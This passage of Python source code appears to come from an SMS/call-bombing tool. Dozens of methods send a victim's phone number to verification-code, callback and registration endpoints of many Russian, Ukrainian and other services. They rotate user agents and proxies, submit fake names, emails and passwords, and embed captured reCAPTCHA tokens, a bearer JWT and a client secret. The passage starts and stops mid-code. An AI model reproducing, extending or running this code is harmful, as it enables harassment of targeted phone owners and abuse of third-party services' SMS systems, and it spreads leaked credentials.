        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get('https://www.farpost.ru/sign/recover/helper?ajax=1&text=+'+self.phone_not_pluse+'&mode=reg&referer=https%3A%2F%2Fwww.farpost.ru%2Fsign&strongMatch=0&showSource=1&farpostOnly=0&dromOnly=0&allowQuickRestoreLinks=0', headers=headers_copy, proxies=proxies)
        requests.post('https://www.farpost.ru/sign', headers=headers_copy, data={'radio':'reg','sign':self.phone}, proxies=proxies)
        requests.get(f'https://www.farpost.ru/sign/confirm?sessionGeoId=0&sign={self.phone_not_pluse}&entrance=&registration=ok&ts=1606751018', headers=headers_copy, proxies=proxies)

    def notecash(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://notecash.ru/backend/send", headers=headers_copy, data={'phone-top':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'r':None}, proxies=proxies)

    def id_ykt(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://id.ykt.ru/api/v3/register/sendCode', headers=headers_copy, data={'phone': self.phone_not_pluse[1:]}, proxies=proxies)

    def uteka(self,proxies):
        headers = {
        'authority': 'uteka.ru',
        'authorization': 'null',
        'authorization2': 'undefined',
        'platform': 'Desktop',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://uteka.ru',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://uteka.ru/',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cookie': 'utid=uRELsmBTJ+lyGGd5BQxTAg==; uteka_force_desktop=false; _ym_uid=1616062430223817853; _ym_d=1616062430; _ga=GA1.2.595856838.1616062430; _gid=GA1.2.793657016.1616062430; _ym_isad=1; _fbp=fb.1.1616062432495.1742407618; uteka_city_id=1',
        }

        params = (
            ('method', 'auth.GetCode'),
        )

        data = '{"jsonrpc":"2.0","id":2,"method":"auth.GetCode","params":{"phone":"uryn","mustExist":false,"sendRealSms":true}}'.replace('uryn',self.phone_not_pluse[1:])

        response = requests.post('https://uteka.ru/rpc/', headers=headers, params=params, data=data, proxies=proxies)

    def chibbis(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://szr.chibbis.ru/account/requestverificationcode',headers=headers_copy, data={"PhoneNumber":phone_mask(self.phone_not_pluse, '+#(###) ###-####'), "ResendToken":''}, proxies=proxies)

    def syzran(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://syzran.farfor.ru/callback/',
        data={"csrfmiddlewaretoken":'vWG9OCe8dXY2RqsiaxLdnnNEHcUkfoq7Pb8QkkYjjNlL0nNCtf9ovoMTXnE7M3DY', "phone":phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')}, headers=headers_copy, proxies=proxies)

    def beeline_kz(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://beeline.kz/restservices/telco/auth/{self.phone_not_pluse[1:]}/checkexists',
        headers=headers_copy, proxies=proxies)

    def gnevskii(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://xn--b1abgnfccv2b.xn--p1ai/scripts/form-u18785.php', data={'custom_U18799':_ru_name_(), 'custom_U18791':self.phone, 'custom_U18795':'1'},
        headers=headers_copy, proxies=proxies)

    def esk_ural(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://lk.esk-ural.ru/application/v3/user/registration-validation',
        json={"phone":self.phone}, headers=headers_copy, proxies=proxies)

    def pikru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.pik.ru/v1/phone/check',
        json={"phone":phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),"service":"confirmRegistrationSmsPikru"},
        headers=headers_copy, proxies=proxies)

    def edame(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://eda.me/ajax/getcall.php',
        json={'city':'Москва', 'domain':'eda.me', 'tel':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'comment':' '},
        headers=headers_copy, proxies=proxies)

    def vladimirvilkinetru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://vladimir.vilkinet.ru/runtime/sendpass/?phone={self.phone_not_pluse[1:]}', headers=headers_copy, proxies=proxies)

    def remontnik(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.remontnik.ru/api/v2/register/step_10/',
        json={"name":_ru_name_(),"email":email(),"phone":self.phone_not_pluse,"social":"false","time_zone":-180,"screen_size":"2048×1080x24","system_fonts":"Arial, Arial Narrow, Bitstream Vera Sans Mono, Bookman Old Style, Century Schoolbook, Courier, Courier New, Helvetica, Palatino, Palatino Linotype, Times, Times New Roman",
        "supercookie":"DOM localStorage, DOM sessionStorage"}, headers=headers_copy, proxies=proxies)

    def macdonal(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number":self.phone,"g-recaptcha-response":"03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V"}, headers=headers_copy, proxies=proxies)

    def findclone(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://findclone.ru/register?phone={self.phone}', headers=headers_copy, proxies=proxies)

    def eshko(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.eshko.by/orders/create/free_download',
        data={'kurs':'1', 'iname':_ru_name_(), 'fname':_ru_name_(), 'email':email(),
        'phone':self.phone}, headers=headers_copy, proxies=proxies)

    def dtrparts(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://dtrparts.by/',headers=headers, data={'mark':name(), 'text-breake':' ', 'phone':self.phone, 'submit':'%D0%A0%D0%B0%D1%81%D1%81%D1%87%D0%B8%D1%82%D0%B0%D1%82%D1%8C'}, proxies=proxies)

    def smsint2(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://smsint.ru/bitrix/templates/sms_intel/ajax/registration.php',
        data={'phone':self.phone_not_pluse, 'name':_ru_name_(), 'code':' ', 'fpc':'null'}, headers=headers_copy, proxies=proxies)

    def turbosms(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://turbosms.ua/registration.html', headers=headers_copy,
        data={'country':'1', 'login':username(), 'phone':self.phone_not_pluse[1:], 'email': email(),
        'password':password(), 'agry':'on', 'send':'%D0%97%D0%B0%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C%D1%81%D1%8F'}, proxies=proxies)


    def www360(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.360.by/ajax/sendActivationStep',
        data={'phone':self.phone, 'step':'phone_validate'}, headers=headers_copy, proxies=proxies)

    def delivio(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://delivio.by/be/api/user/check', json={"phone":self.phone}, headers=headers_copy, proxies=proxies)

    def carte(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://carte.by/auth/', data={'ajax':'register', 'login':username(), 'pass':password(), 'phone':self.phone, 'company':0, 'resend':1, 'checksum':504}, headers=headers_copy, proxies=proxies)

    def farmakopeika(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://farmakopeika.ru/local/ajax/forms/re_call_form.php',data={'WEB_FORM_ID':1, 'sessid':'47ea89r6ca1b105894td0eea3a4e5f0g', 'phone':self.phone_not_pluse[1:], 'name':name()}, headers=headers_copy, proxies=proxies)

    def farmacia24(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://admin.24farmacia.ru/api_new/user/phone?phone={self.phone_not_pluse[1:]}', headers=headers_copy, proxies=proxies)

    def wowworks2(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.wowworks.ru/v2/site/send-code/site/registration', headers=headers_copy, json={"phone":self.phone_not_pluse,"validKey":"43aGdBq490DСiK4xRiКgF3moD1ou-oPDAnHakhad_YRRtWAl9W7pXP6jUijm9d2wNC5wiGeypWL2rD5i09ThyuOmM7QyDE0ROqB1cHJMoOP2vkgZSsWjIzCbGtkVfji1CLsxX0lpQ_tDhtqQ9yUzkLJX9XPb_1rQvQT3Ni14f04HV8zqZ-9c9VWTK50cZykfgmvW6qzVDEeGXO8tCyx8r1MREFJTi2VQJOnFncqhCQBbb9g1z0lZKpsaypJwdt6atEPan1Jv2Crb8UrKTYMhf_JTur5OOlOvJDmlD02H3b2j7xHOECtGxBhpxzfqeCL4C2gpplwAqNXw4zSg79T5o-S_PD21d9Uze3-Px84hFBc0dIZM0z324QYzKhgmLJCxuzFVADOLJsxevND84NQbNcme_ERc0cWGLnX6p33RhX-7jERFKXjuu3aQglyYg8S8Cuv-UlVQY25a-y"}, proxies=proxies)

    def bigd_host(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(f'https://bigd.host/Settings/SendPhoneVerificationCodeAjax?phoneNumber={self.phone}', headers=headers_copy, proxies=proxies)

    def cian(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        agent = user_agent()
        requests.post(f'https://api.cian.ru/sms/v1/send-code/', headers=headers_copy, json={"phone":self.phone,"type":"authenticateCode"}, proxies=proxies)

    def sushiwokru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://sushiwok.ru/user/phone/validate', headers=headers_copy, json={"phone":phone_mask(self.phone_not_pluse,'+#(###)###-##-##'),"numbers":4}, proxies=proxies)

    def bettery_ru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://clientsapi02.at-resources.com/cps/superRegistration/createProcess', headers=headers, json={"fio":_ru_name_(),"password":f' {password()}',"email":email(),"emailAdvertAccepted":'true', "phoneNumber":self.phone, "webReferrer":"","advertInfo":"","platformInfo":headers_copy['User-Agent'],"promoId":"","sysId":1,"lang":"ru"}, proxies=proxies)

    def pass_media(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://pass.media/api/actions/check_phone/?phone={phone_mask(self.phone_not_pluse,"+# ### ### ## ##")}', headers=headers_copy, proxies=proxies)

    def autheasypayua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(f'https://auth.easypay.ua/api/users/desktop/forgot/{self.phone_not_pluse}', headers=headers_copy, proxies=proxies)

    def ionua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://ion.ua/api/apr/temporary-register', headers=headers_copy, json={'login': self.phone}, proxies=proxies)

    def sloncreditua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://sloncredit.ua/client/login', headers=headers_copy, data={'phone': self.phone}, proxies=proxies)

    def backzecreditcomua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://back.zecredit.com.ua/v1/api/rest/verifications', headers=headers_copy, json={'phone': self.phone_not_pluse, 'action': 'REGISTRATION'}, proxies=proxies)

    def ontaxicomua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://ontaxi.com.ua/api/v2/web/client', headers=headers_copy, json={'country': 'UA', 'phone': self.phone_not_pluse[2:]}, proxies=proxies)

    def ukloncomua_two(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://uklon.com.ua/api/v1/account/code/send', headers=headers_copy, json={'phone': self.phone_not_pluse}, proxies=proxies)

    def partner_uklo_two(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers=headers_copy, json={'phone': self.phone_not_pluse}, proxies=proxies)

    def alloua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://allo.ua/ua/customer/account/createPostVue/?isAjax=1&currentLocale=uk_UA', headers=headers_copy, data={'firstname': _ru_name_(), 'telephone': self.phone_not_pluse[1:], 'email': email(), 'password': '46lX2dnyUhDQ', 'form_key': 'No7l3BqVVoQJ6Djm'}, proxies=proxies)

    def n17459yclientscom(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://n17459.yclients.com/api/v1/book_code/26760', headers=headers_copy, json={'phone': self.phone_not_pluse}, proxies=proxies)

    def passporttwitchtv_two(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://passport.twitch.tv/register?trusted_request=true', headers=headers_copy, json={'birthday': {'day': 1, 'month': 9, 'year': 1997}, 'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True, 'password': password(), 'phone_number': self.phone_not_pluse, 'username': username()}, proxies=proxies)

    def apiiconjob_co_two(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.iconjob.co/api/auth/verification_code', headers=headers_copy, json={'phone': self.phone_not_pluse}, proxies=proxies)

    def ggbetru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://ggbet.ru/api/auth/register-with-phone', headers=headers_copy, data={'phone':self.phone, 'login': email(), 'password': password(), 'agreement': 'on', 'oferta': 'on'}, proxies=proxies)

    def durexrubackendprod(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://durex-ru-backend.prod.moscow.rbdigitalcloud.com/api/v1/users/confirmation_code/', headers=headers_copy, json={'phone': self.phone_not_pluse}, proxies=proxies)



    def wwwdnsshopru_two(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.dns-shop.ru/auth/auth/fast-authorization/', headers=headers_copy, data={'FastAuthorizationLoginLoadForm[login]': self.phone_not_pluse, 'FastAuthorizationLoginLoadForm[token]': ''}, proxies=proxies)


    def almatyinstashopkz(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://almaty.instashop.kz/?login=yes', headers=headers_copy, data={'AUTH_FORM': 'Y', 'USER_REMEMBER': 'Y', 'backurl': '', 'TYPE': 'CHECKLOGIN', 'is_ajax_request': 'Y', 'USER_COUNTRY': self.country_code, 'USER_LOGIN': phone_mask(self.phone_not_pluse[1:], '###-###-##-##')}, proxies=proxies)


    def gdz_ruwork(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://gdz-ru.work/api/subscriptions/subscribe/45?', headers=headers_copy, params={'return_to': '/subscribe/?return_to=%2Fgdz%2Falgebra%2F8-klass%2Fmuravin', 'book_id': '23143', 'src_host': 'gdz.ltd', 'woid': '275004200', 'msisdn': self.phone_not_pluse, 'agreement': '1'}, proxies=proxies)


    def smotrimru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://smotrim.ru/login', headers=headers_copy, data={'phone': self.phone_not_pluse}, proxies=proxies)


    def wwwriglaru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.rigla.ru/rest/V1/mindbox/account/generateSMS', headers=headers_copy, json={'telephone': self.phone_not_pluse}, proxies=proxies)


    def loymaxivoinru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration', headers=headers_copy, json={'password': '', 'login': self.phone_not_pluse}, proxies=proxies)


    def amurfarmaru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://amurfarma.ru/local/templates/amurfarmacy_2015/ajax.php', headers=headers_copy, data={'ajaxtype': 'send_sms', 'phone': phone_mask(self.phone, '+# (###) ###-##-##')}, proxies=proxies)


    def kulinaristamarket(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://kulinarista.market/api/v1/auth/sms-code', headers=headers_copy, json={'phone': self.phone_not_pluse[1:]}, proxies=proxies)


    def aptekamagnitu(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://apteka.magnit.ru/api/personal/auth/code/', headers=headers_copy, data={'phone': self.phone_not_pluse}, proxies=proxies)


    def autodozvon(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://autodozvon.ru/test/makeTestCall', headers=headers_copy, params = {'to': phone_mask(self.phone_not_pluse[1:], "(###) ##-##-##)")}, proxies=proxies)


    def htvplatform24tv(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://24htv.platform24.tv/v2/otps', headers=headers_copy, json = {'phone':self.phone_not_pluse}, proxies=proxies)


    def apilike_videocom(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms', headers=headers_copy, json = {'telephone': self.phone_not_pluse, 'lang': "ru"}, proxies=proxies)


    def mydrom_ru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://my.drom.ru/sign/recover?return=https%3A%2F%2Fchelyabinsk.drom.ru%2Fauto%2Fall%2F%3Futm_source%3Dyandexdirect%26utm_medium%3Dcpc%26utm_campaign%3Ddrom_74_chelyabinsk_auto-rivals_alldevice_search_handmade%26utm_content%3Ddesktop_search_text_main%26utm_term%3D%25D0%25B0%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D1%2583%2520%25D1%2587%25D0%25B5%25D0%25BB%25D1%258F%25D0%25B1%25D0%25B8%25D0%25BD%25D1%2581%25D0%25BA%26_openstat%3DZGlyZWN0LnlhbmRleC5ydTsxNzY3NTA4MzsxOTMxNzMyNzE4O3lhbmRleC5ydTpwcmVtaXVt%26yclid%3D7777444668347802164%26tcb%3D1609147011', headers=headers_copy, data = {'sign':self.phone_not_pluse}, proxies=proxies)


    def harabaru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://haraba.ru/Account/Register', headers=headers_copy, data = {'phone': self.phone_not_pluse,'pass1': 'Myp-Vbq-RbE-zvH','pass2': 'Myp-Vbq-RbE-zvH','ip': None,'type': 1,'company': None}, proxies=proxies)


    def zaimbistrodengi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://zaim.bistrodengi.ru/sdo/user/loginLK', headers=headers_copy, json = {'name': "Арсений Анатольевич", 'phoneNumber': self.phone_not_pluse, 'birthDate': "1984-01-04"}, proxies=proxies)


    def passrutuberu(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get('https://pass.rutube.ru/api/accounts/user-exists/', headers=headers_copy, params = {'phone': self.phone} )


    def mobileapiqiwicom(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://mobile-api.qiwi.com/oauth/authorize', headers=headers_copy, data = {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': self.phone, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'}, proxies=proxies)

    def medicina360ru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://medicina360.ru/site/generatesmscode', headers=headers_copy, data = {'phone': phone_mask(self.phone_not_pluse, "+# (###) ###-##-##"),'send_sms': 1}, proxies=proxies)

    def apieldoradoua_two(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://api.eldorado.ua/v2.0/sign?lang=ua&action=phone_check&login={self.phone_not_pluse}', headers=headers_copy, proxies=proxies)

    def wwwutairru(self,proxies):
        token = 'Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1NjkzIiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmVtZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyJdLCJleHAiOjE2NDExODIzNDh9.crO5rLAZ1btPDgplxCVPjx9NtO_nHB7I83Gyf1QYeGE'

        requests.post('https://www.utair.ru/mobile/api/v8/account/profile', json = {'login': self.phone_not_pluse, 'confirmationGDPRDate': '1609647178956'}, headers = {'Authorization':token,'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36'}, proxies=proxies)
        requests.post('https://www.utair.ru/mobile/api/v8/user/login', json = {'login': self.phone_not_pluse, 'confirmationType': "callCode"}, headers = {'Authorization':token,'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36'}, proxies=proxies)

    def x80aaiccccwa6aik(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(f'https://xn--80aaiccccwa6aiktadcodj9azr.xn--p1ai/ajax/vote.php?mode=sendphone&vote_id=109&vote_phone={phone_mask(self.phone_not_pluse,"+# (###) ###-##-##")}&url=https://xn--80aaiccccwa6aiktadcodj9azr.xn--p1ai/', headers=headers_copy, proxies=proxies)

    def disk_apimegafonru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://disk-api.megafon.ru/api/3/md_otp_tokens/', json = {'phone':self.phone_not_pluse}, headers=headers_copy, proxies=proxies)


    def apteka_one(self,proxies):
        try:
            auth_html = requests.get('https://apteka38plus.ru/register')
            auth_bs = bs(auth_html.content, 'html.parser')
            token = auth_bs.select('meta[name=csrf-token]')[0]['content']
            password = password()
            for i in range(2):
                requests.post('https://apteka38plus.ru/register/confirm',data={'_token': token, 'name': _ru_name_(),
                            'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),
                             'email': email(), 'password': password, 'password_confirmation': password,
                             'redirect_to': 'https://apteka38plus.ru/verify', 'notify_offers': 'on'}, proxies=proxies)
        except:
            pass

    # МОИ РАЗРАБОТКИ

    def petrovich(self,proxies):
        headers = {"User-Agent": generate_user_agent()}
        am = requests.post('https://api.petrovich.ru/api/rest/v1/user/pincode/reg?city_code=rf&client_id=pet_site', headers=headers, cookies={
        'SNK': '117',
        'u__typeDevice': 'desktop',
        'u__geoNotice': '1',
        'u__geoCityGuid': 'd31cf195-2928-11e9-a76e-00259038e9f2',
        'u__geoUserChoose': '1',
        'u__cityCode': 'rf',
        'SIK': 'dQAAADZbxUqd32EPvMkGAA',
        'SIV': '1',
        'C_osSDbp0FcST_c_FmqukxslZnGH0': 'AAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8D8AAKCzP2vpQc9MccMnRGsvnpYv4sdk5n8',
        '_gid': 'GA1.2.1225754889.1615056493',
        '_ga_XW7S332S1N': 'GS1.1.1615056489.1.0.1615056489.0',
        'ssaid': '81315260-7eac-11eb-b0db-abea8ae1e2e1',
        'dd__persistedKeys': '[%22custom.lastViewedProductImages%22]',
        'dd_custom.lastViewedProductImages': '[]',
        '__tld__': 'null',
        'dd__lastEventTimestamp': '1615056493778',
        '_dc_gtm_UA-23479690-1': '1',
        '_ga': 'GA1.2.241129551.1615056493',
        '_gat_ddl': '1',
        '_ym_uid': '1615056495804408167',
        '_ym_d': '1615056495',
        '_gcl_au': '1.1.1012885484.1615056495',
        '_ym_isad': '1',
        'rrpvid': '18063703900892',
        'rcuid': '5fe8a97d08718b000115e393',
        'rr-VisitorSegment': '1%3A1',
        'mindboxDeviceUUID': 'fc9b81f4-1e69-4e96-bd85-bb32c0aea013',
        'directCrm-session': '%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
        '_fbp': 'fb.1.1615056502774.1799575406',}, data={"phone":f"{self.phone_not_pluse}"}, proxies=proxies)


    def wink(self,proxies):
        headers = {
        'authority': 'cnt-lbrc-itv02.svc.iptv.rt.ru',
        'accept': 'application/json, text/plain, */*',
        'session_id': '548d200c-7eaf-11eb-989a-9c1d36dcd09c:1951416:2237006:2',
        'x-wink-version': 'v2021.02.26.1558',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://wink.rt.ru',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://wink.rt.ru/',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',}
        data = '{"phone":"ttext","action":"register"}'.replace('ttext', self.phone_not_pluse)
        response = requests.post('https://cnt-lbrc-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code', headers=headers, data=data, proxies=proxies).json()

    def sravni(self,proxies):
        cookies = {
        '_ym_uid': '1605105660244322467',
        '_ym_d': '1605105660',
        '.ASPXANONYMOUS': 'jvxYwEsMfk6BXQlriYYL-A',
        '_SL_': '6.1509745.1509752.',
        '_ipl': '6.1509745.1509752.',
        'AB_CREDIT': 'Test_00035_A',
        'AB_CREDIT_DIRECT': 'never',
        '__utmz': 'utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3dorganic%7cutmcsr%3dyandex%7cutmctr%3d(not%20set)',
        '__utmx': 'utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3dorganic%7cutmcsr%3dyandex%7cutmctr%3d(not%20set)',
        '_gcl_au': '1.1.1184645255.1615059953',
        '_gid': 'GA1.2.2020936344.1615059954',
        '_ga': 'GA1.1.438067474.1615059954',
        '_ym_isad': '1',
        '_ym_visorc': 'b',
        '_fbp': 'fb.1.1615059955644.1650744830',
        '_ga_TEQH0NKK0Q': 'GS1.1.1615059953.1.0.1615059960.53',
        '.AspNetCore.Antiforgery.vnVzMy2Mv7Q': 'CfDJ8Mo79Uhrc61BkNG7HBanVqey_muvSzqi8_qIWrDo7MvoMz1r6iPZhAwaENKUFBCsiIHPPym3PgRb6xnirgX748K_CmjcUdOCglvTvyYhl6X8hX4N3BFiH_-8LFKVUPq5VsP0Cu_jIIaR6ZNHpJCBvEQ',
        'reuserid': '7f78bafd-738d-4923-8eb8-4541519c3745',
        }

        headers = {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'Origin': 'https://my.sravni.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
